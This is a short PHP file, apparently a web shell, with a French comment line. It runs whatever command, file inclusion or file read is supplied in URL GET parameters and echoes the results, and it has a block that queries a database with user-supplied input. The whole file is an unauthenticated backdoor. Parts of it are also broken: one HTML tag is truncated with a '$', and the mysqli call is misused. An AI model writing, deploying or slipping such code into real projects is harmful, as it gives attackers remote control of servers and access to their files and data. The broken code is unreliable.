<?php

include($_GET['include']);
$file=  file_get_contents($_GET['i'], FILE_USE_INCLUDE_PATH);
echo $file;
if(isset($_GET['system'])){
echo'<p> rentre dans les commande system</p>';
$b=array();
exec($_GET['system'],$b);
$b[0].='</script>';
foreach ($b as $i => $value) {
    echo $value.'<br>';
}
}
if(isset($_GET['info'])&&isset($_GET['info'])){
$resultat = mysqli_query($_GET['info'], $_GET['r']);
while($donnees = mysqli_fetch_row($resultat))
                        {
                                echo'
                                <tr>
                                        <td><input type="checkbox" name="cle[]"$
                                        <td>'.$donnees[1].'</td>
                                        <td>'.$donnees[2].'</td>
<td>'.$donnees[3].'</td>
<td>'.$donnees[4].'</td>

                                </tr>';
                        }
}
?>
